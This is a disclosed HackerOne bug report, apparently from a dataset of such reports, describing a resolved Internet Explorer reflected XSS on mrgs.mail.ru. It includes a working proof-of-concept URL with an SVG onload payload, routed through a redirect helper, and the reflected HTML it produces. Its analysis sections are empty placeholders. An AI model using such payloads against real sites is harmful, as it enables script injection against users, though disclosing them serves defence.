---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '66422'
original_report_id: '66422'
title: '[mrgs.mail.ru] Internet Explorer XSS via Request-URI'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-06-07T16:21:34.710Z'
disclosed_at: '2016-10-06T12:22:27.652Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [mrgs.mail.ru] Internet Explorer XSS via Request-URI

## Metadata

- HackerOne Report ID: 66422
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2016-10-06T12:22:27.652Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Открыть с помощью Internet Explorer 
(для формирования правильного запроса используется баг перенаправления, поэтому необходим сценарий "bf.am/x?r=")

```
http://bf.am/x?r=https://mrgs.mail.ru/"><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/
```

Результат:
```
<input type="hidden" name="target" value="/"><svg/onload=alert(document.domain)>/%2e%2e/%2e%2e/">
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
